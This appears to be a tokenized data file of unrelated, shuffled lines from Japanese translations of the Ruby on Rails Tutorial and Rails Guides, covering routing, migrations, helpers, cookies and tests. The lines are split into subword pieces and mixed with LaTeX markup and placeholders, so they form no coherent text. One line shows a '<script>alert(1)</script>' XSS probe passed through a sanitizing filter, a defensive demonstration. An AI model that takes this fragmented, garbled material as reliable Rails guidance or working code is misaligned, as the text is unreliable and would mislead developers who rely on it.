▁ ユーザーを フォロー するための フォーム
▁ どちらの 記 法 も よく 使われ ているので 、 両方 の 見 分 け が つ く こと が重要です 。
▁document ▖ cookie プロパティ には 、 生成 元 web サーバー の cookie が保存され ています 。
▁Rails には データベース スキーマ を 管理 するための ドメイン 固 有 言語 ( DSL : ▁Do main ▁ Specific ▁ Language ) があり 、 マイグレーション ( migration ) と呼ばれ ています 。
▁\ emph { or ▁equal s } という 概念 は 一見 神 妙 不可 思 議 に見えます が 、 他の もの に な ぞ ら え て 考え れば 難 しく ありません 。
▁S 3 アカウント の作成 と 設定 が 終わったら 、 CarrierWave の設定 ファイルを 次の リスト \ ref { code : carrier _ w a ve _ configuration } のように 修正 してください ▟ [ B R ] ╼[ B R ] ╼ ( 訳 注 : ▁ fo g で リ ー ジ ョ ン を指定する 場合は 、 ▁: re g ion ▁=> ▁ ENV [' S 3 _ RE G ION '] ▁ といった パラメータを 渡 し 、 heroku ▁config : set ▁S 3 _ RE G ION =" リ ー ジ ョ ン 名 " ▁ といった コマンドを実行 することで 設定 できます ▟ なお 、 東京 の リ ー ジ ョ ン 名 は ▁" a p - n or the a st - 1 " ▁ です ▟ [ A W S _ S 3 _ RE F ])
▁-> ▁Inde x ▁S can ▁using ▁users _ p key ▁on ▁users ▁( cost = 0 ▖ 00 ▖ ▖ 8 ▖ 27 ▁rows = 1 ▁ width = 4 )
▁belongs _ to ▁: customer , ▁class _ name : ▁" P at r on ",
▁TIP : ▁200 ▁OK ヘッダー だけ を送信し たい のであれば 、 ここで ご 紹 介 した ` render ▁: not h ing ` よりも 、 本ガイド で 後 述 する ` head ` メソッド を使用する 方が おそらく よいでしょう 。
▁# ▁=> ▁[ [ - 5 ] , ▁[ - 3 , ▁- 2, ▁- 1 ] , ▁[1, ▁2, ▁3] , ▁[ 5 ]]
▁この 設定 に すると 、 I 18 n に 渡される すべての ロケール は 、 available _ locales リスト で 宣言 され ていなければ 使用できません 。
▁( end )╼╼ ▁\ subsection { フォロワー } ▁% ▁( fold )╼ ▁\ label { sec : followers }╼╼
▁{0} 図 2▖1 4 {/0} {1} マイクロポストの 作成 に 失敗した場合 の エラーメッセージ ▟\ href { http :// railstutorial ▖ org / images / figures / micropost _ length _ error _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁require ▁ :: File ▖ expand _ path (' ▖ ▖ / config / environment ', ▁ _ _ FIL E _ _ )
▁* ▁` ActiveSupport :: D eprecation ▖ silence ` は ブロック を 1 つ 引数に 取り 、 すべての 非推奨 警 告 メッセージ を 抑 制 します 。
▁NOTE : ▁` namespace ` スコープ を使用すると 、`: module ` や `: path ` プレフィックス に 加えて `: as ` も 自動的に 追加 されます 。
▁<%= ▁render (@ products ) ▁|| ▁" The re ▁are ▁no ▁ products ▁available ▖ "
▁最初の コードをリスト \ ref { code : failed _ login _ attempt } に示します ▁( このコード は わざと 少し 間 違 え て あります ) 。
▁get ▁' c la sh ing / : id ' ▁=> ▁' test # example ', ▁as : ▁: example
▁Rails に 貢献 す べ く 活 動 し ていれば 、 その プルリクエスト は ここ を 変 え た 方が よい のではないかと い う フィードバック を受け ること が き っ と 一度 や 二 度 ある でしょう 。
▁\ k ode { edit } アクションと \ k ode { update } アクション が 保 護 されている かどうか テスト する 。
▁最初に \ href { http :// signup ▖ heroku ▖ com /}{ Heroku で ユーザー登録 } します 。
▁ ウェブ アプリケーションの 文 脈 では 、\ emph { 認 証 } ▁( authentication ) ▁ は サイトの ユーザーを 識 別 すること であり 、\ emph { 認可 } ▁( authorization ) ▁ はその ユーザーが 実行 可能な 操作を 管理 することです 。
▁### ▁ オプション の 展開
▁Client ▖ order (: created _ at )
▁ユーザーの 作成 、 表示 、 編集 方法 について 説明しました ので 、 今度は ユーザーを削除 してみましょう ▁({0}{1} 図 2▖1 0 {/1}{/0} ) 。
▁> > ▁Rails ▖ env ▖ production ?
▁ 生成された 名前 が どのような もの で あ れ 、 適切な マイグレーション を実行して 結合テーブル を生成する 必要があります 。
▁* ▁` config ▖ action _ view ▖ raise _ on _ missing _ tr an s l ation s ` は 、 i 18 n で 訳 文 が 失われ ている 場合に エラーを 発生 させる かどうかを指定します 。
▁\ k ode { cookies ▖ signed [: user \_ id ]} では 自動的に ユーザー ID の cookies の 暗 号 が 解除 され 、 元に戻 ります 。
▁image _ tag (" rails ▖ png ") ▁# ▁=> ▁< img ▁src =" http :// assets ▖ example ▖ com / images / rails ▖ png " ▁ alt =" Rails " ▁/>
▁ これはリスト \ ref { code : root _ route } で使用されていました 。
▁リスト { p 0} で {2} log _ in {/2} という ヘルパーメソッド を 定義 できたので 、 や っ と 、 ユーザーログイン を行って セッション の {2} create {/2} アクションを 完了 し 、 ユーザーの プロフィール ページに リダイレクト する 準備ができました 。
▁ 最後の 作業 です ▟ この エンジンの ` articles ` リソース は エンジンの ルート ▁( root ) ▁ パス に 置く のが ふ さ わ しい でしょう 。
▁ これら を 引 き 続 き 使用 したい場合は 、[ Pro t ec ted ▁Attributes ▁gem ]( https :// github ▖ com / rails / protected _ attributes ) ▁ を導入する ことで ス ム ー ズ に アップグレード することができます 。
▁( 実際 、\ ref { sec : demo _ users _ resource } や \ ref { sec : microposts _ resource } でも 説明したように 、\ k ode { rails ▁generate } を実行すると ルーティング の \ k ode { routes ▖ rb } ファイル も 自動的に 変更 される ので 、 これも 元に戻 さ なくてはなりません ) 。
▁User モデルに 存 在 確 認 バリデーション を追加する
▁ Connection : ▁close
▁最後に 、 変更を コミット します 。
▁続いて \ k ode { Factory G ir l } メソッド を実行します 。
▁d ▁= ▁Date ▖ current
▁ここで ` method : ▁: patch ` という オプション が指定されてい ます ので 、` PATCH ` という HTTP メソッドを使用して この フォーム を送信し よう と している ことが Rails に 伝 わ ります ▟ PATCH メソッドは 、 REST プロトコル に基いて リソース を ▁** 更新 ** ▁ するために使用されます 。
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁images # show ▁| ▁ photo _ path (: id ) ▁|
▁stylesheet _ link _ tag ▁" application " ▁# ▁=> ▁< link ▁ href ="/ assets / application ▖ css " ▁ media =" screen " ▁ rel =" stylesheet " ▁/>
▁@ article ▖ destroy
▁(\ emph { to _ s } メソッドを 呼び出し ている のは 、\ k ode { nil } トークン を 扱えるように する ためです ▟ ブラウザで nil トークン が発生する ことは あって はなりません が 、 テスト 中に 発生 することは あり え る ためです ) 。
▁ div に 続いて 、 埋め込み Ruby コードが 出 現 します 。
▁* ▁ MySQL : ▁[ EXPLAIN ▁Ou t put ▁Format ]( http :// dev ▖ mysql ▖ com / doc / ref man / 5 ▖ 6 / en / explain - out put ▖ html )
▁COM ", ▁" THE _ U S - ER @ foo ▖ bar ▖ org ", ▁" first ▖ last @ foo ▖ jp "]
▁</ ul >
▁ その他の 情報 源
▁ インライン では 、 デフォルトで ERB を使用して 出力 を行います 。
▁Active ▁Support は Ruby ▁on ▁Rails の コンポーネント であり 、 Ruby 言語 の拡張 、 ユーティリティ 、 その 他 横 断 的な 作業を 担 っています 。
▁I R C が 初めて であれば 、 まず ▁“ irc ▁client ▁< あなた の プラットフォーム > ” で 検索 する ことをお勧めします 。
▁デフォルトは ", ▁" です 。
▁この場合 の \ k ode { id } 属性 は単なる 整 数 ▁( すなわち \ k ode { self ▖ id } は ユーザーの id ) ▁ である ため 危 険 はありません が 、 SQL 文 に インクルード される 変数 を \ emph { 常に } エスケープ する 習慣 は ぜ ひ 身につけ てください 。
▁ 実行 結果を 示す ために ` puts ` や ` p ` などの 印 字 用 メソッド を使用すること は なるべく 避ける 。
▁これにより 、 たとえ 他の エンジン や アプリケーションに article リソース が あって も 衝 突 を 回 避 できます 。
▁{0}{1} 第 2 章 {/1}{/0} の演習 で 少し 触れ ましたが 、 name 属性 の存在 を 検 査 する方法 は 、 リスト { p 2 } に示した とおり 、 {3} validates {/3} メソッドに {3} presence : ▁true {/3} という 引数 を与え て 使う ことです 。
▁上のコードでは 以下 を使用しました 。
▁\ k ode { current _ user } の コードを書く 上で 、 以下の行 については 注意が必要です 。
▁リスト { p 0} で モジュール を インクルード している ので 、 Session コントローラで {2} log _ in {/2} メソッド を使用できます 。
▁` multiline ?` メソッドは 、 正規表現 に ` / m ` フラグ が設定され ている かどうかをチェックします ▟ この フラグ が設定され ている と 、 ドット ▁( ▖) ▁ が 改行 にマッチし 、 複 数 行 を 扱えるように なります 。
▁ モデル レベルで のバリデーション は 、 データベースに 依 存 せず 、 エ ンド ユーザーが バ イ パス すること も でき ず 、 テスト も 保 守 も 容 易 だ からです 。
▁ これはリスト \ ref { code : micropost _ belongs _ to _ user _ spec } で使用されていました 。
▁ / microposts /1/ edit
▁ シ ング ル ト ン の ` true ` および ` false ` は 等 幅 フォント で 表 記 すること ( 訳 注 : ▁ シ ング ル ト ン の ` true ` および ` false ` とは 、` T r ue Class ` および ` F al se Class ` の 唯 一 のインスタンス の ことです ) 。
▁* ▁` initialize _ dependency _ mechanism `: ▁` config ▖ cache _ classes ` が true の場合 、` ActiveSupport :: Dependencies ▖ mechanism ` で 依 存 性 を ( ` load ` ではなく ) ` require ` に設定し ます 。
▁これで 、 最初の 機能 を備えた エンジンの 生成 に 成功 しました 。
▁ 実 の ところ 、 たとえば Book sController クラスの update アクション 内で 、 本 の 更新 に 失敗した ら edit テンプレート を 出力 したい と すると 、 以下の どの レンダリング 呼び出し を行って も 最終的に は 必ず ` views / books ` ディレクトリ の ` edit ▖ html ▖ erb ` を使用して 出力 が 行われます 。
▁` application / new ` に テンプレート がある かどうか を探し ている のは 、` Article sController ` コントローラは ` Application Controller ` コントローラ を継承し ている からです 。
▁( 第 \ ref { cha : log _ in _ log _ out } 章で 本 格 的に 実装します ) 。
▁hidden _ field (: user , ▁: token )
▁: pre m i um _ video job s
▁ Form ヘルパーは フォーム 用の HTML を生成し 、 テキスト や パスワード といった 入力 の種類 に応じた メソッド を提供します 。
▁この 関数 は \ emph { ヘルパー } と呼ばれ ます ▟ カスタム ヘルパー を作成する 方法 を学ぶ ために 、 まず リスト \ ref { code : application _ layout _ redux } の タイトル 行 の 部分 に注目し ましょう 。
▁{0} クラス 2▖1 5 {/0} ▁╼╼{1} \ k ode { UsersController } クラスにおける継承 {3} {/3} ▁ { 4 } app / controllers / users _ controller ▖ rb {/4} {/1}
▁| config ▖ ru | アプリケーションの 起動 に 必要となる 、 Rack ベースの サーバー 用の Rack 設定ファイル です 。
▁class ▁To p ic ▁< ▁ActiveRecord :: Base
▁ レシーバ 自体 の キー に対して 破壊的な ブロック 操作 を適用する ` transform _ keys !` メソッド もあります 。
▁Rails ▁3▖1 以降 では 、 静 的 ファイルを 目的 別 に 分 類 する 、 標準的な \ emph { 3 つの } ディレクトリ が 使用される ようになりました ▟ Rails ▁4▖0 で も同様です 。
▁( 詳細な 文字列 を調べる ために { p 0} で紹介した {2} inspect {/2} メソッド を使っています ▟)
▁ の基礎 を学ぶ ことを 重 点 と し 、
▁` is _ missing ?` は 、 パス 名 を引数に取り 、 特定の ファイル が原因で 例外 が発生する かどうか をテストします ▁( "▖ rb " 拡張子 が 原 因 と 思 わ れる 場合 を 除 きます ) 。
▁class ▁G u est s C le an up J ob ▁< ▁ ActiveJob :: Base
▁#### # ▁` collection << ( object , ▁ ▖▖▖)
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁push ▁ heroku
▁--------- -
▁従って 、 この場合は ` app / views / books / index ▖ html ▖ erb ` ファイル が出力されます 。
▁Microposts コントローラのアクション に 認 証 を追加する 。
▁Rails ▁ 3▖0 や Rails ▁2▖ x からの アップグレード の 際に は 、 いくつかの 作業 を行う 必要があります 。
▁ 自分で わざわざ 作 ら なくても 、 い つ も 使える 方法を ただ 利用 するだけで は いけない のでしょうか 。
▁{0} 図 2▖1 0 {/0} {1} ユーザーを削除する ▟\ href { http :// railstutorial ▖ org / images / figures / demo _ destroy _ user _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁ これまで に 使用 した 属性 と異なり 、 パスワード 関連の 属性 は 「\ emph { 仮 想 }」 にする 点に注意 してください ▟ つまり 、 これらの 属性 は 一時 的に メモリ 上 に置き 、 データベースに は 保存 されない ようにします 。
▁render ▁template : ▁" products / show "
▁ conflict ▁config / application ▖ rb
▁ メールアドレス の 小文字 変換 に対するテスト は 演習 として 残しておきます ▁(\ ref { sec : modeling _ users _ exercises }) 。
▁# ▁< rank > 2 </ rank >
▁boolean ? ▁?
▁#### # ▁` find _ in _ batches ` の オプション
▁` blank ?` メソッドを 使えるように する 最も 「 軽 量 な 」 方法は 、 その メソッドが 定義されている ファイル だけ を 選 んで 読み込む ことです 。
▁=> ▁ { : success =>" It ▁work ed !" , ▁error : ▁" It ▁failed ▖ "}
▁次の 章 に進む前に 、 すべての 変更を master ブランチにマージ しておきましょう 。
▁\ k ode { user ▖ save } は \ k ode { false } を返し ました ▟ これは 保存 に 失敗した ことを意味します 。
▁def ▁index
▁< head >
▁# ▁< id ▁type =" integer "> 19 0 3 16 </ id >
▁ Validations ▁with ▁# ▁some ▁< tt > : on </ tt >
▁ な ぜ そんな 面倒な ことを しない と いけない のでしょうか 。
▁ 皆さん が 著者 と同じ 間 違い を し ていなければ 、 このテストは ▁\ passing ▁ になるはずです 。
▁ユーザー登録 の 失敗 に 対応 できる \ k ode { create } アクション
▁ global - 9 08 e 25 f 4 b f 64 1 868 d 868 3022 a 5 b 6 2 f 5 4 ▖ css
▁この 記 法 は 、 実際には Rails による コア Ruby 言語 の拡張 として 行われた のが 始 まり です ▟ この 記 法 が あまり に 便利な ので 、 後に Ruby 自身 に まで 取り 入 れ られた ほど です 。
▁デフォルトは ` true ` です 。
▁以下の例 を見てみましょう 。
▁# ▁=> ▁{" a " =>1 }
▁@ account ▁= ▁@ supplier ▖ create _ account ( term s : ▁" Net ▁30 ")
▁d ▖ prev _ week ▁# ▁=> ▁Mon , ▁2 6 ▁Apr ▁2010
▁ これはリスト \ ref { code : users _ migration } で使用されていました 。
▁ タイトル に ERB コード を使用した Home ページのビュー
▁ 何 や ら 目 新しい コード が追加され ています 。
▁[ rubyonrails - core メ ー リ ング リスト ]( http :// groups ▖ google ▖ com / group / rubyonrails - core / ) を ご 利用 ください 。
▁ここでは \ k ode { time \_ ago \_ in \_ words } という ヘルパーメソッド を使っています ▟ これは メソッド名 の 表 す とおり ですが 、「 3 分 前に 投 稿 」 といった 文字列 を出力します ▟ 具体的な 効果 について \ ref { sec : sample _ microposts } で説明します 。
▁ただし 、 これは 完 璧 な テスト ではありません ▟ たとえば ベース タイトル に “ Ruby ▁on ▁Rails ▁T u to i al ” といった 誤 字 が あった としても 、 この テストでは 発 見 すること が できない でしょう 。
▁ データベース接続 を プール する
▁ せっかく なので 、 統合 テストを実行 中 かどうかを 論理値 で 返す \ k ode { integration _ test ?} メソッド を定義し 、 以下のように if - the n ス テ ート メ ン ト を わかりやすく 書く ことにしましょう 。
▁1 冊 の 雑 誌 に だけ リンク したい のであれば 、 以下のように 書き ます 。
▁ユーザーの id 読み出し には \ k ode { params } を使用しました 。
▁ / sessions
▁このとき の レスポンス は以下のようになります 。
▁上の ` update ` アクション で モデル に対する ` update ` メソッドの 呼び出し が 失敗する と 、 同じ コントローラに 用 意 して お いた 別の ` edit ▖ html ▖ erb ` テンプレート を使用して 出力 します 。
▁しかし この メ ー リ ング リスト は 、 こうした アイディア について 議 論 するために 用 意 された 場所 です 。
▁Rails ▁4▖0 では ` ERB :: Util # json _ escape ` の エイリアス ` j ` が 廃 止 されました ▟ この エイリアス ` j ` は既に ` ActionView :: Helpers :: JavaScript Helper # escape _ javascript ` で使用されている ためです 。
▁</ aside >
▁orders ▖ size
▁xml ▖ h 1 (@ person ▖ name )
▁ 今回 の目的は 、 アプリケーションの HTML 構造 を調べ て 、 レイアウト の各 リンク が正しく 動く かどうか チェック することです ▟ つまり 、
▁first _ name : ▁' does ▁not ▁exist '
▁ サーバーを起動 します 。
▁ ブロック であること を 示す には 波 かっこ ▁ { ▁ } ▁ で 囲 みます が 、 以下のように do と end で 囲 んで 示す こともできます 。
▁作成した コードをリスト \ ref { code : users _ resource } に示します
▁その 結果 、 リスト \ ref { code : microposts _ resource } のコードは 、 フル セット のルーティング ▁( 表 \ ref { table : RESTful _ microposts }) ▁ の サブ セット である RESTful ルート ▁( 表 \ ref { table : demo _ RESTful _ microposts }) ▁ になります 。
▁また 、\ emph { コード } そのもの にも スタイル を与え ます ▟ つまり 、 散 ら か り はじめ た コード レイアウト を \ emph { パーシャル } を使用して 整 え る ということです 。
▁この テストでは 、\ k ode { reload } メソッドを使用して データベースから 値 を再度 読み込み 、\ k ode { assert _ equal } メソッドを使用して 同 値 である かどうかを テスト してください 。
▁` find _ or _ create _ by ` メソッドは 、 指定された 属性 を持つ レコード が存在する かどうかをチェックします 。
▁ パスワードが 空 のまま でも 更新 できるように する
▁@ current _ user ▁ ||= ▁User ▖ find _ by ( id : ▁session [: user _ id ])
▁ 一見 、 上のコード は 比 較 を 行 っている よう に見えます が 、 これは 比 較 では \ emph { ありません } ▟ 比 較 であれば \ k ode {==} を使用する はずです が 、 ここでは \ emph { 代入 } を行って います 。
▁ アセット 圧縮 方 式 を指定する には 、` production ▖ rb ` の 該当する 設定 オプション を設定します ▟ ` config ▖ assets ▖ css _ compressor ` は CSS の 圧縮 方 式 、` config ▖ assets ▖ js _ compressor ` は JavaScript の 圧縮 方 式 をそれぞれ 指定します 。
▁ ORM を使用することで 、 SQL 文 を直接 書く 代りに わずか な アクセス コードを書く だけで 、 アプリケーション における オブジェクトの 属性 や リレーションシップ を データベースに保存 したり データベースから 読み出し たり すること が できるようになります 。
▁<%= ▁f ▖ label ▁: comment er ▁%>< br >
▁ 今回は ユーザー登録ページ の ため だけ に SSL を導入し ますが 、 これは Web サイト 全体 で 適用 できる ため 、 第 \ ref { cha : log _ in _ log _ out } 章で 実装 する ログイン 機 構 を セキュア に したり 、\ ref { sec : remember _ me } で説明する \ emph { セッションハイジャック } の 脆弱性 に対して も 多くの 利 点を 生 み 出 します 。
▁cookie に 複雑な オブジェクトを 保存 し なければならない 場合は 、 後 続 の リクエスト で cookies から 値を 読み 出 す 場合 の 変換 については 自分で 面倒 を見 る必要があります 。
▁ sanitize ▁@ article ▖ body , ▁tags : ▁% w ( table ▁ tr ▁ td ), ▁attributes : ▁% w ( id ▁class ▁style )
▁1 番目の 新しい テスト 例 は 、 単 なる 健 全 性 チェック です ▟ これ を使用して 、 まず \ k ode {@ user } という subject が 有効 かどうかを確認 します 。
▁Tue , ▁31 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁ Regexp ▖ new (' ▖ ')▖ multiline ?
▁╼╼\ begin { ve rb at im } ╼
▁ たとえ ヒント が あった としても 、 以下の 機能 が 本書 の 最 終 章 の演習 よりも \ emph { ずっと } 難 易 度 が 高い ことは 変わりません ▟ 相 当 頑 張 った にもかかわらず 挫折 すること も 当 然 ある と思います ので 、 どう か そんな ときには 落 ち 込 ま ないでください 。
▁development モード の場合 、 ビューテンプレート が変更され ると ファイルの 日付 で 変更 が 検出 され 、 再度 コンパイル されます 。
▁ そのために は 、 Rails アプリケーション サーバーを起動 し なくてはなりません 。
▁この場合 は以下のように 宣言 します 。
▁` collection ▖ where ` メソッドは 、 コレクション に含まれている メソッドを 指定された 条件 に基いて 検索 します ▟ このメソッド では オブジェクトは 遅 延 読み込み ( lazy ▁load ) される 点にご注意ください ▟ つまり 、 オブジェクト に 実際に アクセス が 行われ る 時に だけ データベース への クエリ が発生し ます 。
▁ フォローしているユーザー を表示する ページ と 、 フォロワー を表示する ページ は 、 いずれも ユーザープロファイルページ と ユーザーインデックスページ ▁(\ ref { sec : users _ index }) ▁ を 合わせ た ような 作り になる という 点 で 似 ています ▟ どちら にも フォロー の 統 計 情報 などの ユーザー情報 を表示する サイドバー と 、 ユーザーの リスト があります 。
▁なお 、 このコード では HTML と ERb が 雑 に 混 ざ っています ▟ これを キ レ イ に 整 形 する 課題 は 演習 として 残しておきます ▁(\ ref { sec : signup _ exercises }) 。
▁### ▁` multiline ?
▁これらの 問 い に 答 え るために は 、 Active ▁Record を使って User オブジェクト を検索する 方法 について 学ぶ 必要があります 。
▁なお 、 Rake タスク で \ k ode { spec } の テストスイート を 実行 できる ことも 覚え て おくとよいでしょう ▁( 他の 開発者 が 使 っている の を 見た こと がある かもしれません ) 。
▁# ▁gem ▁' guard - rspec ', ▁' 2▖ 5▖0 '
▁ 有効なメールアドレス を送信し た場合
▁ 名前空間 内の コントローラ は以下のように 直接 指定 することができます 。
▁{0} 図 7 ▖ 10 {/0} ▁{1} 現状の ユーザー登録ページ ▁\ href { http ://0▖0▖0▖0:3000/ signup }{/ signup }{/1}
▁ これはリスト \ ref { code : user _ update _ action _ unsuccessful } で使用されていました 。
▁ RubyGems が インストール されていない 場合は 、\ href { http :// rubygems ▖ org / pages / download } { RubyGems を ダウンロード } して 解 凍 し 、 作成された \ k ode { rubygems } ディレクトリ で セットアップ プログラム を実行し てください 。
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁\ ref { sec : layout _ link _ tests } のように 、 ▁\ k ode { assert _ select } を使って 関連 ページの HTML 要素を テスト していきます ▟ これにより 、 今後 う っかり 要素 を変更 して しま って も 気 付ける ようになります 。
▁\ ref { sec : the _ first _ application } でも 簡単に 説明したように 、 Bundler は \ k ode { rails } によって自動的に 実行 ▁( この場合は \ k ode { bundle ▁install }) ▁ されます ▟ ここでは デフォルトの アプリケーション gem を変更 して Bundler を再度 実行 してみます 。
▁#### # ▁` seconds _ since _ midnight `
▁上のコード を エンジン 内で 使用する と 、 行 き 先 は ** 常に ** アプリケーションのルート になります 。
▁` NOT ▁NULL ` データベース 制 約 のある 関連付け では 、`: nullify ` オプション を与え ないようにする 必要があります 。
▁TIP : ▁ リソースフルな ルーティング に アクション が 多数 追加 されている ことに 気 付 い たら 、 それ 以上 アクション を追加する の を や めて 、 そこに 別の リソース が 隠 されている のではないかと 疑 って み る 方が よいでしょう 。
▁self を省略した 結果を リスト \ ref { code : user _ relationships _ association } に示します 。
▁ /* ╼ ▁* ▁------------ ---------------- ---------------- ---------------- ---------------- ╼ ▁* ▁" THE ▁B E ER W A RE ▁L I C E N SE " ▁( R evi s ion ▁4 3 ) : ╼ ▁* ▁ Michael ▁Hartl ▁wrote ▁this ▁code ▖
▁def ▁ products _ layout
▁ 特定の 状 況 では 、 この 邪悪な HTML が 標的ユーザー の ブラウザで 表示される ことがあります 。
▁` scope ` メソッド には 、「 浅 い 」 ルーティング を カスタマイズ するための オプション が 2 つ あります 。
▁最初に 、` public / ` ディレクトリ 以下の ファイルを 新しい 場所 に移動し ます 。
▁# ▁< contributors ▁type =" array ">
▁リスト \ ref { code : micropost _ order _ test } では 、 マイクロポスト 用の fixture ファイル から サンプルデータを 読み出し ているので 、 次の fixture ファイル も 必要 になります ▁( リスト \ ref { code : micropost _ fixtures }) 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / load _ error ▖ rb ` です 。
▁上のコードによって以下 の ヘッダー が生成されます 。
▁Users リソース の場合と同様 に 、 Microposts リソース も scaffold で コードを 生成 してみましょう ▟\ k ode { rails ▁generate ▁scaffold } コマンド を使用して 、 図 \ ref { fig : demo _ micropost _ model } の データモデル を実装 してみます
▁ 数値 を フォーマット 済み 文字列に変換 する メソッド 群 を提供します 。
▁create ▁app / helpers / static _ pages _ helper ▖ rb
▁ いつものように 、 以下を実行して テストスイート が ▁ {0}{1}{/1}{1}{2} 緑色 {/2} {/1}{1}{/1}{/0} ▁( 成功 ) ▁になることを確認 してから先に進 みましょう 。
▁{0}{1} 第 5 章 {/1}{/0} では 、 新しい ユーザー を作成するための ス タブ ページを 作 った ところで 終わり ました ▁(\ ref { sec : user _ signup }) 。
▁最初に 、 リスト \ ref { code : bootstrap _ sass } で 示 している ように Bootstrap を追加しましょう ▟ これは 、\ text tt { bootstrap - sass } ▁gem を使用して Rails アプリケーションに 導 入 できます 。
▁ 表示 された もの を い ろ い ろ クリック してみてください 。
▁* ▁ ビルトイン の Active ▁Record バリデーション ヘルパー の使用
▁ ec tion { E x er ci s es }╼\ label { sec : exercises _ remember _ me }╼╼\ input { fragments / so ci e t y _ exercises _ note }╼╼\ begin { enumerate } ╼ ▁\ item ▁By ▁ inspect ing ▁your ▁browser ' s ▁cookies ▁directly , ▁verify ▁that ▁the ▁`` remember ▁me '' ▁checkbox ▁is ▁ having ▁its ▁intend ed ▁effect ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 0 c 1 e 9 6 ' ></ span >╼╼ ▁\ item ▁At ▁the ▁console , ▁in v ent ▁examples ▁ showing ▁both ▁possible ▁behavior s ▁of ▁the ▁ ternary ▁operator ▁( Bo x ~\ ref { aside : ternary _ o p er at or }) ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 3 ac 7 3 ' ></ span >╼ \ end { enumerate } ╼╼% ▁section ▁remember _ me ▁( end )╼╼ \ section { Remember のテスト } ▁% ▁( fold )╼\ label { sec : remember _ tests }╼╼
▁ 関連付けを 設定 していない 状態 では 、 モデルの 宣言 は以下のようになります 。
▁ RedCloth ▖ new (' < script > alert (1) </ script > ', ▁ [: filter _ html ]) ▖ to _ html
▁この モデル に対して クエリ が 実行 された ときの SQL クエリ は以下のような感じ になります 。
▁ここで 行いたい 選択 は 、 上 よりも もう少し 複 雑 で 、 たとえば 以下のような 感じ になります 。
▁ これを 実際に 行う には \ k ode { cookies } メソッドを使用します ▟ このメソッドは 、\ k ode { session } のときと同様に ハッシュ として 扱 えます 。
▁もし 上の 例 が 少し 不 自然に 思える なら ば 、 勘 が 鋭 い と い えます ▟ という の も 、 これは わざと 不 自然に 書いた からです 。
▁# ▁ 有効化 していない 状態 で ログイン してみる
▁scope ▁: created _ before , ▁-> ( time ) ▁ { ▁where (" created _ at ▁< ▁? ", ▁time ) ▁ }
▁ オプション ハッシュ に含まれる `: before ` キー を使用して 、 新しい イニシャライザ より 前に 実行 したい イニシャライザ を指定することができます ▟ 同様に 、`: after ` キー を使用して 、 新しい イニシャライザ より ▁ _ 後 _ ▁ に 実行 したい イニシャライザ を指定できます 。
▁mail ( to : ▁user ▖ email ) ▁do ▁| format |
▁これらの 統合テスト を 基本的な テスト に 留 め 、 網羅 的な テスト ではありません 。
▁` render ▁: text ` を使用すると ` text / html ` で 送信される ため 、 セキュリティ上の リスク が生じ る可能性があります 。
▁id ▁1 の ユーザーが id ▁2 、 7 、 8 、 10 を フォローしている ときの フィード 。
▁ 運 悪 く 、 サインアップ と 編集 フォーム が 古 い バージョンの メッセージ パーシャル を利用して い るため 、 User の request ▁ spec が 壊 れ てしまい ました 。
▁< img ▁src =' http :// us ▖ i 1 ▖ y img ▖ com / us ▖ y img ▖ com / i / us / nt / ma / ma _ mail _ 1 ▖ g if '
▁上の例では 、` / assets / s m ile ▖ png ` のような パス は 返 されません ▁( 読み やすくするため ダイジェスト 文字 は 省略 して あります ) 。
▁ アプリケーションの ` config / application ▖ rb ` ファイル も 以下のように 更新 する必要があります 。
▁\ k ode { ▖ gitignore } ファイルは 、\ k ode { rails ▁new } コマンド を実行すると 自動的に 生成 され 、 Rails プロジェクト 用の パターン も 記 入 されます ▟ もちろん 、 自分で パターン を追加して も か ま いません
▁このとき 、 Rails は 与えられた ファイル名 の 末尾に ▁\ k ode { _ test } ▁という 文字列 を追加する ことに注目してください 。
▁上のコード により 、 以下のような ` script ` タグ が出力されます 。
▁" "▖ html _ safe ▁+ ▁"< "▖ html _ safe ▁# ▁=> ▁"< "
▁{0} 図 2▖1 {/0} {1} GitHub で デ モ アプリ 用 リポジトリ を作成する ▟\ href { http :// railstutorial ▖ org / images / figures / create _ demo _ repo _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁@ book ▁= ▁ Book ▖ find ( params [: id ])
▁ 追加 タイトル
▁Rails ▁4▖0 では 複数の ディレクトリ からの ヘルパー の 読み込み 順 が変更され ました 。
▁=> ▁Call ▁with ▁- d ▁to ▁ de t a ch
▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル : ▁ 実 例 を使って ▁Rails ▁ を 学 ぼ う }
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁Users ▁and ▁Microposts ▁controllers ▖
▁create ▁ spec / models / user _ spec ▖ rb
▁* ▁`: re strict _ with _ exception ` を指定すると 、 関連付けられた レコード がある場合 に 例外が発生します 。
▁| ▁PATCH / PUT ▁| ▁ / geocoder ▁| ▁ geocoder s # update ▁| ▁1 つ しか ない geocoder リソース を更新する ▁|
▁今度は ` ENV [' DAT A BASE _ URL ']` の 接続 情報 は 無視 されました ▟ アダプタ と データベース 名 が異なります 。
▁users ▁= ▁User ▖ all
▁ 現在のユーザー に フォロー されている ユーザー を表示する
▁X ▁= ▁: in _ M
▁なお 、 この問題 には ▁( や や 古 い ですが ) ▁ 有 益 な 議 論 があります ▟ ▁ 詳 しく は ▁\ href { http :// blog ▖ has many through ▖ com / 2008 / 4/ 2 / simple - pages } { has many through に 投 稿 された 記事 「 simple ▁pages 」 } ▁( 英語 ) ▁ を読んでみてください 。
▁<%= ▁ ex p en s ive _ file s _ o p er ation ▁%>
▁これで 、 リンク が 生成される 時に " / app 1 " が ディレクトリ 名 の 前 に追加されます 。
▁ データ の モデル 化 が終わった ので 、 今度は アカウント有効化 メールの 送信 に必要な コード を追加しましょう 。
▁ ブラウザから ソース を見 ること で 確 認 が できます が 、 Rails が 埋め込み Ruby を 評価 し 、 レイアウト を 描画 すると 、 上の リスト は以下のように 置 き 換 わ ります
